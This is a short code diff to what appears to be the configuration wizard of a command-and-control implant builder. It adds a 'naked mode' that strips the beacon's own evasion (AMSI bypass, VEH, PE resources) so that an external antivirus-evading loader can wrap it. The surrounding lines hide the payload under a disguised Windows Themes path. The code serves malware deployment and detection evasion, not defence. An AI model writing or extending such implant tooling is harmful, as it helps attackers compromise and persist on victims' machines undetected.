@@ -190,6 +190,8 @@ _COMMON_FIELDS = [
     {"name": "blob_path_win",  "label": "Windows Blob Path","type": "text",
      "default": r"%APPDATA%\Microsoft\Windows\Themes\.ddb"},
     {"name": "debug_mode",     "label": "Debug Mode",     "type": "bool",     "default": False},
+    {"name": "naked_mode",     "label": "Naked Mode",     "type": "bool",     "default": False,
+     "hint": "Strip all beacon-internal evasion (AMSI bypass, VEH, PE resources). Enable when wrapping the beacon with an external FUD loader."},
     {"name": "agent_name_win",   "label": "Windows Agent Name", "type": "text", "default": ""},
     {"name": "agent_name_linux", "label": "Linux Agent Name",   "type": "text", "default": ""},
 ]
@@ -582,6 +584,7 @@ def _run_wizard(task: "_DeployTask", provider: str, config: dict,
         "blob_path_linux": "linux_blob_path",
         "blob_path_win":   "windows_blob_path",
         "debug_mode":      "enable_debug_output",
+        "naked_mode":      "naked_beacon_external_loader_handles_evasion",
         "session_label":   "label",
         # Google Drive: form sends app_key/app_secret, config expects client_id/client_secret
         "app_key":    "client_id",
